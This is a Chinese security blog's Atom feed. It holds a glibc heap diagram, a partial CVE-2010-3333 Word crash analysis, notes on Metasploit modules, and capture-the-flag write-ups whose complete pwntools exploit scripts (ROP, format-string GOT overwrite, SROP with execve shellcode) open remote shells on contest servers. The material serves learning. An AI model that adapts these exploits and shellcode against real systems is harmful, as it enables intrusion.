<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Ree</title>
  <subtitle>做一些微不足道的贡献。</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://reehy.top/"/>
  <updated>2017-05-14T12:23:38.828Z</updated>
  <id>http://reehy.top/</id>
  
  <author>
    <name>Ree He</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>glibc-heap导图</title>
    <link href="http://reehy.top/2017/05/14/glibc-heap%E5%AF%BC%E5%9B%BE/"/>
    <id>http://reehy.top/2017/05/14/glibc-heap导图/</id>
    <published>2017-05-14T12:16:45.000Z</published>
    <updated>2017-05-14T12:23:38.828Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2017/05/14/glibc-heap导图/heap.png" alt="heap"></p>
<p><a href="http://blog.a7vinx.me/" target="_blank" rel="external">img from</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/2017/05/14/glibc-heap导图/heap.png&quot; alt=&quot;heap&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.a7vinx.me/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;img from&lt;
    
    </summary>
    
    
      <category term="PWN" scheme="http://reehy.top/tags/PWN/"/>
    
      <category term="heap" scheme="http://reehy.top/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2010-3333</title>
    <link href="http://reehy.top/2017/05/10/CVE-2010-3333/"/>
    <id>http://reehy.top/2017/05/10/CVE-2010-3333/</id>
    <published>2017-05-09T16:04:20.000Z</published>
    <updated>2017-05-10T00:15:57.121Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>2017SSCTF中遇到，顺便学习，第一次接触CVE和win的漏洞。</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>win7 sp1 简体中文<br>word2003简体中文</p>
<h2 id="crash分析"><a href="#crash分析" class="headerlink" title="crash分析"></a>crash分析</h2><p>这个漏洞就是一个单纯栈溢出漏洞。<br>先从一个crash样本开始。样本按照《漏洞战争》说明生成即可。</p>
<p>首先已经知道出问题的地方在rtf文档的画图属性，由于没有正确计算参数的长度，导致strcpy的时候产生了溢出。<br>先查看crash文档的内容。</p>
<p><img src="/2017/05/10/CVE-2010-3333/1.png" alt="1"></p>
<p>发现在一定长度后填充的大量的字符串。<br>windbg附加到word上，查看崩溃现场。</p>
<p><img src="/2017/05/10/CVE-2010-3333/2.png" alt="2"></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;p&gt;2017SSCTF中遇到，顺便学习，第一次接触CVE和win的漏洞。&lt;/p&gt;
&lt;h2 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;he
    
    </summary>
    
    
      <category term="CVE" scheme="http://reehy.top/tags/CVE/"/>
    
      <category term="Win" scheme="http://reehy.top/tags/Win/"/>
    
  </entry>
  
  <entry>
    <title>2017广东红帽pwn</title>
    <link href="http://reehy.top/2017/05/09/2017%E5%B9%BF%E4%B8%9C%E7%BA%A2%E5%B8%BDpwn/"/>
    <id>http://reehy.top/2017/05/09/2017广东红帽pwn/</id>
    <published>2017-05-09T14:13:59.000Z</published>
    <updated>2017-05-09T14:20:01.826Z</updated>
    
    <content type="html"><![CDATA[<p>第一次ak，记录下。不过主要因为题目很简单。</p>
<h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>栈溢出，<code>system</code>已经有了，用rop在.rodata段上写/bin/sh，然后调用system即可。</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line"><span class="built_in">from</span> pwn import *</div><div class="line"></div><div class="line">slog = <span class="number">0</span></div><div class="line"><span class="built_in">local</span> = <span class="number">0</span></div><div class="line">debug = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="built_in">global</span> p</div><div class="line"></div><div class="line"><span class="keyword">if</span> slog: context(log_level = <span class="string">'debug'</span>)</div><div class="line"><span class="keyword">if</span> <span class="built_in">local</span>:</div><div class="line">    p = <span class="built_in">process</span>(<span class="string">'./pwn1'</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    p = remote(<span class="string">'106.75.93.221'</span>,<span class="number">10000</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> <span class="built_in">local</span> <span class="keyword">and</span> debug:</div><div class="line">    gdb.attach(p, <span class="built_in">open</span>(<span class="string">'debug'</span>))</div><div class="line"></div><div class="line">elf = ELF(<span class="string">'./pwn1'</span>)</div><div class="line">system_plt = elf.symbols[<span class="string">'system'</span>]</div><div class="line">scanf_addr = elf.symbols[<span class="string">'__isoc99_scanf'</span>]</div><div class="line">bss = elf.bss</div><div class="line">main = <span class="number">0x08048531</span></div><div class="line">ppr = <span class="number">0x080485ee</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="built_in">offset</span> = <span class="number">52</span></div><div class="line"></div><div class="line">def pwn():</div><div class="line">    payload = cyclic(<span class="built_in">offset</span>) + p32(scanf_addr) + p32(main) + p32(<span class="number">0x08049629</span>) + p32(<span class="number">0x0804A028</span>)</div><div class="line">    payload1 = cyclic(<span class="number">44</span>) + p32(system_plt) + p32(<span class="number">1234</span>) + p32(<span class="number">0x0804a028</span>)</div><div class="line">    p.recvuntil(<span class="string">'test'</span>)</div><div class="line"><span class="comment">#    gdb.attach(p)</span></div><div class="line">    p.sendline(payload)</div><div class="line">    p.sendline(<span class="string">'/bin/sh'</span>)</div><div class="line">    p.sendline(payload1)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    pwn()</div><div class="line">    p.interactive()</div></pre></td></tr></table></figure>
<h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p>格式化字符串漏洞。先泄露<code>__libc_start_main+246</code>的地址，然后将<code>printf</code>的got改成system。问题是我们没有libc。libc的信息是第一题的shell中得到的，用<br><code>readelf -a libc-2.12 | grep __libc_start_main</code>和<code>readelf -a libc-2.12 | grep system</code><br>得到libc中函数的偏移再计算即可。其中要注意libc的页对齐。</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line">from pwn import *</div><div class="line"></div><div class="line">slog = <span class="number">1</span></div><div class="line"><span class="keyword">local</span> = <span class="number">0</span></div><div class="line">debug = <span class="number">0</span></div><div class="line"></div><div class="line">global p</div><div class="line"></div><div class="line"><span class="keyword">if</span> slog: context(log_level = <span class="string">'debug'</span>)</div><div class="line"><span class="keyword">if</span> <span class="keyword">local</span>:</div><div class="line">    p = process(<span class="string">'./pwn2'</span>)</div><div class="line">    libc = ELF(<span class="string">'/lib32/libc.so.6'</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    p = remote(<span class="string">'106.75.93.221'</span>,<span class="number">20002</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> <span class="keyword">local</span> <span class="keyword">and</span> debug:</div><div class="line">    gdb.attach(p, <span class="keyword">open</span>(<span class="string">'debug'</span>))</div><div class="line"></div><div class="line">elf = ELF(<span class="string">'./pwn2'</span>)</div><div class="line">printf_got = elf.got[<span class="string">'printf'</span>]</div><div class="line"></div><div class="line">def leak(payload):</div><div class="line">    p = process(<span class="string">'./pwn2'</span>)</div><div class="line">    p.sendline(payload)</div><div class="line">    <span class="keyword">return</span> p.recvall(<span class="number">0</span>.<span class="number">1</span>)</div><div class="line"></div><div class="line">def pwn():</div><div class="line"><span class="comment"># 7611: 00016c40   437 FUNC    GLOBAL DEFAULT   12 __libc_start_main</span></div><div class="line"><span class="comment"># 6733: 0003ae80   125 FUNC    WEAK   DEFAULT   12 system</span></div><div class="line">    payload = <span class="string">'%267$x'</span></div><div class="line">    p.sendline(payload)</div><div class="line">    leak_addr = <span class="keyword">int</span>(p.recv(<span class="number">8</span>), <span class="number">16</span>)</div><div class="line">    <span class="keyword">print</span> <span class="string">'__libc_start_main =&gt; '</span>, <span class="keyword">hex</span>(leak_addr)</div><div class="line">    libc_address = leak_addr - <span class="number">0x0016c30</span> - <span class="number">246</span></div><div class="line">    <span class="keyword">print</span> <span class="string">'libc_address =&gt; '</span>, <span class="keyword">hex</span>(libc_address)</div><div class="line"></div><div class="line"><span class="comment">#    fmt = FmtStr(leak)</span></div><div class="line"><span class="comment">#    print 'offset =&gt; ', fmt.offset</span></div><div class="line"></div><div class="line">    system_addr = libc_address + <span class="number">0x0003ae80</span></div><div class="line">    <span class="keyword">write</span> = &#123;printf_got:system_addr&#125;</div><div class="line">    payload = fmtstr_payload(<span class="number">7</span>, <span class="keyword">write</span>, <span class="number">0</span>, <span class="string">'byte'</span>)</div><div class="line"><span class="comment">#    payload = fmtstr_payload(fmt.offset, write, 0, 'byte')</span></div><div class="line">    p.sendline(payload)</div><div class="line">    p.sendline(<span class="string">'/bin/sh\x00'</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name_<span class="number">_</span> == <span class="string">'__main__'</span>:</div><div class="line">    pwn()</div><div class="line">    p.interactive()</div></pre></td></tr></table></figure>
<h2 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h2><p>logo函数中会把ebp-0x1c的位置填充为0xdadadada，这样当我们一开始输入id长度为8时最后的\x00就会被覆盖，这样在update id的时候strlen函数就会把0xdadadada以及下面的name的堆指针给计算进去，我们修改id的时候就能修改到name指针。这样我们就存在了任意地址读和写。</p>
<p>将name指针改为atoi_got，print name得到libc地址，将其修改为system地址传入/bin/sh即可。同样的，偏移在pwn1的shell中得到。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">slog = <span class="number">0</span></div><div class="line">local = <span class="number">0</span></div><div class="line">debug = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="keyword">global</span> p</div><div class="line"><span class="keyword">global</span> libc</div><div class="line"></div><div class="line"><span class="keyword">if</span> slog: context(log_level = <span class="string">'debug'</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">makeio</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> local:</div><div class="line">        p = process(<span class="string">'./pwn3'</span>)</div><div class="line">        libc = ELF(<span class="string">'/lib32/libc.so.6'</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        p = remote(<span class="string">'106.75.93.221'</span>,<span class="number">10002</span>)</div><div class="line">        libc = ELF(<span class="string">'/lib32/libc.so.6'</span>)</div><div class="line">    <span class="keyword">return</span> p, libc</div><div class="line"></div><div class="line"><span class="keyword">if</span> local <span class="keyword">and</span> debug:</div><div class="line">    gdb.attach(p, open(<span class="string">'debug'</span>))</div><div class="line"></div><div class="line">elf = ELF(<span class="string">'./pwn3'</span>)</div><div class="line">printf_got = elf.got[<span class="string">'printf'</span>]</div><div class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</div><div class="line">fgets_got = elf.got[<span class="string">'fgets'</span>]</div><div class="line">stdout = <span class="number">0x0804A060</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">upid</span><span class="params">(payload)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'=&gt;'</span>)</div><div class="line">    p.sendline(<span class="string">'1'</span>)</div><div class="line">    p.recvuntil(<span class="string">'ID.'</span>)</div><div class="line">    payload = <span class="string">'123456781234'</span>+payload</div><div class="line">    p.sendline(payload.ljust(<span class="number">0x15</span>, <span class="string">'1'</span>))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">printname</span><span class="params">()</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'=&gt;'</span>)</div><div class="line">    p.sendline(<span class="string">'4'</span>)</div><div class="line">    p.recvuntil(<span class="string">'name:'</span>)</div><div class="line">    p.recv(<span class="number">1</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">printlogo</span><span class="params">()</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'=&gt;'</span>)</div><div class="line"><span class="comment">#    gdb.attach(p)</span></div><div class="line">    p.sendline(<span class="string">'5'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">upmem</span><span class="params">(num)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'=&gt;'</span>)</div><div class="line">    p.sendline(<span class="string">'2'</span>)</div><div class="line">    p.sendline(str(num))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">upname</span><span class="params">(payload)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'=&gt;'</span>)</div><div class="line">    p.sendline(<span class="string">'3'</span>)</div><div class="line">    p.send(payload)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></div><div class="line">    upid(p32(address))</div><div class="line">    printname()</div><div class="line">    data = p.recv(<span class="number">4</span>)</div><div class="line">    log.info(<span class="string">"%#x =&gt; %s"</span> % (address, data))</div><div class="line">    <span class="keyword">return</span> data</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(p)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'id'</span>)</div><div class="line">    p.send(<span class="string">'12345678'</span>)</div><div class="line">    printlogo()</div><div class="line"></div><div class="line"><span class="comment">#    d = DynELF(leak, elf=ELF('./pwn3'))</span></div><div class="line"><span class="comment">#    system_addr = d.lookup('system', 'libc')</span></div><div class="line"><span class="comment">#    print system_addr</span></div><div class="line"></div><div class="line">    upid(p32(atoi_got))</div><div class="line">    printname()</div><div class="line">    atoi_addr = u32(p.recv(<span class="number">4</span>)) - <span class="number">0xa000000</span></div><div class="line">    <span class="keyword">print</span> hex(atoi_addr)</div><div class="line"></div><div class="line">    </div><div class="line">    upid(p32(fgets_got))</div><div class="line"><span class="comment">#    gdb.attach(p)</span></div><div class="line">    printname()</div><div class="line">    <span class="keyword">print</span> hex(u32(p.recv(<span class="number">4</span>)))</div><div class="line">    <span class="keyword">print</span> <span class="string">'atoi_addr =&gt; '</span>, hex(atoi_addr) </div><div class="line"></div><div class="line"><span class="comment">#    libc.address = atoi_addr - libc.symbols['atoi']</span></div><div class="line"><span class="comment">#    print 'libc.address =&gt; ', hex(libc.address)</span></div><div class="line"><span class="comment">#    system_addr = libc.symbols['system']</span></div><div class="line"><span class="comment">#    print 'dis libc =&gt; ', hex(atoi_addr - libc.address)</span></div><div class="line"></div><div class="line"><span class="comment">#    print 'distance', hex(system_addr - atoi_addr)</span></div><div class="line">    </div><div class="line">    system_addr = atoi_addr + <span class="number">0xf030</span></div><div class="line">    <span class="keyword">print</span> <span class="string">'system =&gt; '</span>, hex(system_addr)</div><div class="line">    upmem(<span class="number">5</span>)</div><div class="line">    upname(p32(system_addr))</div><div class="line"><span class="comment">#    gdb.attach(p)</span></div><div class="line">    p.recvuntil(<span class="string">'=&gt;'</span>)</div><div class="line">    p.sendline(<span class="string">'/bin/sh\x00'</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    p,libc = makeio()</div><div class="line">    pwn(p)</div><div class="line">    p.interactive()</div></pre></td></tr></table></figure>
<h2 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h2><p>360春秋杯，原题，SROP不说了。。。因为是centos，还要爆破下偏移，感谢小伙伴@Inj3ct0r的偏移计算。<br>当初写的脚本找不到了，网上找了一个。</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*-coding:utf-8-*-</span></div><div class="line"><span class="attr">__author__</span> = 'joker'</div><div class="line">from pwn <span class="built_in">import</span> *</div><div class="line">context.<span class="attr">log_level</span> = <span class="string">"debug"</span></div><div class="line">context.<span class="attr">arch</span> = <span class="string">"amd64"</span></div><div class="line"><span class="comment">#r = process("./pwn4")</span></div><div class="line"><span class="attr">r</span> = remote('<span class="number">106.75</span>.<span class="number">66.195</span>', <span class="number">11006</span>)</div><div class="line"><span class="attr">syscall_addr</span> = <span class="number">0</span>x4000BE</div><div class="line"><span class="attr">start_addr</span> = <span class="number">0</span>x4000B0</div><div class="line"><span class="attr">payload</span> = p64(start_addr)</div><div class="line">payload += p64(start_addr)<span class="comment">#fill</span></div><div class="line">payload += p64(start_addr)<span class="comment">#fill</span></div><div class="line">r.send(payload)</div><div class="line"><span class="comment">#write infor leak</span></div><div class="line">r.send(<span class="string">"\xb3"</span>)<span class="comment">#write 2 start_addr last byte</span></div><div class="line"><span class="attr">data</span> = r.recv(<span class="number">8</span>)</div><div class="line"><span class="attr">data</span> = r.recv(<span class="number">8</span>)</div><div class="line"><span class="attr">stack_addr</span> = u64(data) - <span class="number">0</span>xa00</div><div class="line">print <span class="string">"[*]:stack:&#123;0&#125;"</span>.format(hex(stack_addr))</div><div class="line"><span class="attr">frame</span> = SigreturnFrame()</div><div class="line">frame.<span class="attr">rax</span> = constants.SYS_read</div><div class="line">frame.<span class="attr">rdi</span> = <span class="number">0</span></div><div class="line">frame.<span class="attr">rsi</span> = stack_addr</div><div class="line">frame.<span class="attr">rdx</span> = <span class="number">0</span>x300</div><div class="line">frame.<span class="attr">rsp</span> = stack_addr</div><div class="line">frame.<span class="attr">rip</span> = syscall_addr</div><div class="line"><span class="attr">payload</span> = p64(start_addr)</div><div class="line">payload += p64(syscall_addr)</div><div class="line">payload += str(frame)</div><div class="line">r.send(payload)</div><div class="line"><span class="attr">payload</span> = p64(<span class="number">0</span>x4000B3)<span class="comment">#fill</span></div><div class="line">payload += p64(<span class="number">0</span>x4000B3)<span class="comment">#fill</span></div><div class="line"><span class="attr">payload</span> = payload[:<span class="number">15</span>]</div><div class="line">r.send(payload)<span class="comment">#set rax=sys_rt_sigreturn</span></div><div class="line"><span class="attr">frame</span> = SigreturnFrame()</div><div class="line">frame.<span class="attr">rax</span> = constants.SYS_mprotect</div><div class="line">frame.<span class="attr">rdi</span> = (stack_addr&amp;<span class="number">0</span>xfffffffffffff000)</div><div class="line">frame.<span class="attr">rsi</span> = <span class="number">0</span>x1000</div><div class="line">frame.<span class="attr">rdx</span> = <span class="number">0</span>x7</div><div class="line">frame.<span class="attr">rsp</span> = stack_addr + <span class="number">0</span>x108</div><div class="line">frame.<span class="attr">rip</span> = syscall_addr</div><div class="line"><span class="attr">payload</span> = p64(start_addr)</div><div class="line">payload += p64(syscall_addr)</div><div class="line">payload += str(frame)</div><div class="line">payload += p64(stack_addr + <span class="number">0</span>x108 + <span class="number">8</span>)</div><div class="line"><span class="comment">#payload += cyclic(0x100)#addr ====&gt; start_addr + 0x108</span></div><div class="line">payload += <span class="string">"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"</span><span class="comment">#shellcode</span></div><div class="line">r.send(payload)</div><div class="line"><span class="attr">payload</span> = p64(<span class="number">0</span>x4000B3)<span class="comment">#fill</span></div><div class="line">payload += p64(<span class="number">0</span>x4000B3)<span class="comment">#fill</span></div><div class="line"><span class="attr">payload</span> = payload[:<span class="number">15</span>]</div><div class="line">r.send(payload)<span class="comment">#set rax=sys_rt_sigreturn</span></div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
<h2 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h2><p>老套路了。。将环境变量中文件名的指针覆盖为flag的地址，<code>__stack_chk_fail</code>时候输出即可。</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line"><span class="built_in">from</span> pwn import *</div><div class="line"></div><div class="line">slog = <span class="number">0</span></div><div class="line"><span class="built_in">local</span> = <span class="number">0</span></div><div class="line">debug = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="built_in">global</span> p</div><div class="line"></div><div class="line"><span class="keyword">if</span> slog: context(log_level = <span class="string">'debug'</span>)</div><div class="line"><span class="keyword">if</span> <span class="built_in">local</span>:</div><div class="line">    p = <span class="built_in">process</span>(<span class="string">'./pwnsss'</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    p = remote(<span class="string">'106.75.93.221'</span>, <span class="number">10003</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> <span class="built_in">local</span> <span class="keyword">and</span> debug:</div><div class="line">    gdb.attach(p, <span class="built_in">open</span>(<span class="string">'debug'</span>))</div><div class="line"></div><div class="line">def pwn():</div><div class="line">    p.recvuntil(<span class="string">'something\n'</span>)</div><div class="line">    payload = p32(<span class="number">0x0804a080</span>) * <span class="number">300</span></div><div class="line">    p.sendline(payload)</div><div class="line">    print p.recvline()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    pwn()</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;第一次ak，记录下。不过主要因为题目很简单。&lt;/p&gt;
&lt;h2 id=&quot;pwn1&quot;&gt;&lt;a href=&quot;#pwn1&quot; class=&quot;headerlink&quot; title=&quot;pwn1&quot;&gt;&lt;/a&gt;pwn1&lt;/h2&gt;&lt;p&gt;栈溢出，&lt;code&gt;system&lt;/code&gt;已经有了，用rop
    
    </summary>
    
    
      <category term="PWN" scheme="http://reehy.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>Metasploit learning</title>
    <link href="http://reehy.top/2017/05/09/Metasploit-learning/"/>
    <id>http://reehy.top/2017/05/09/Metasploit-learning/</id>
    <published>2017-05-09T04:14:44.000Z</published>
    <updated>2017-05-14T12:15:55.373Z</updated>
    
    <content type="html"><![CDATA[<h2 id="体系框架"><a href="#体系框架" class="headerlink" title="体系框架"></a>体系框架</h2><p><img src="/2017/05/09/Metasploit-learning/m.png" alt="框架"></p>
<h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><p>Metasploit框架的核心，通过多个模块的组装，完成渗透攻击中各个阶段的不同功能。</p>
<h3 id="辅助模块-AUX"><a href="#辅助模块-AUX" class="headerlink" title="辅助模块 AUX"></a>辅助模块 AUX</h3><p>主要是渗透测试的信息收集环节，进而帮助攻击者完成更精确的攻击。<br>同时还包含一些无需加载攻击载荷，但往往不是为了取得目标系统的权限，比如拒绝服务攻击。</p>
<h3 id="渗透攻击模块-Exploit"><a href="#渗透攻击模块-Exploit" class="headerlink" title="渗透攻击模块 Exploit"></a>渗透攻击模块 Exploit</h3><p>核心功能，又分为主动攻击模块和被动攻击模块，目的是为了获得目标组件的一定的访问权限。<br>攻击模块又分为多个不同的类别，囊括了主流操作系统和一些分支操作系统。</p>
<h3 id="攻击载荷模块-Payloads"><a href="#攻击载荷模块-Payloads" class="headerlink" title="攻击载荷模块 Payloads"></a>攻击载荷模块 Payloads</h3><p>具体的完成指定任务的代码，包括<strong>独立</strong>， <strong>传输器</strong>，<strong>传输体</strong>，三种不同的类型。</p>
<h3 id="空指令模块-Nops"><a href="#空指令模块-Nops" class="headerlink" title="空指令模块 Nops"></a>空指令模块 Nops</h3><p>主要是用来在执行的shellcode前添加添加一大块nop，用来攻击内存随机化，地址偏移等情况。</p>
<h3 id="编码器模块-Encoders"><a href="#编码器模块-Encoders" class="headerlink" title="编码器模块 Encoders"></a>编码器模块 Encoders</h3><p>通过一定的编码来去掉“坏字符”，和绕过一定的安全防御软件，实现免杀。<br>同时注意可能会出现找不到合适的payload的情况。</p>
<h3 id="后渗透攻击模块-Post"><a href="#后渗透攻击模块-Post" class="headerlink" title="后渗透攻击模块 Post"></a>后渗透攻击模块 Post</h3><p>主要用于攻击成功后的工作。比如：内网攻击，本地提权，敏感信息获取等。<br>Metasploit中的后渗透攻击模块的名字成为Meterpretr。</p>
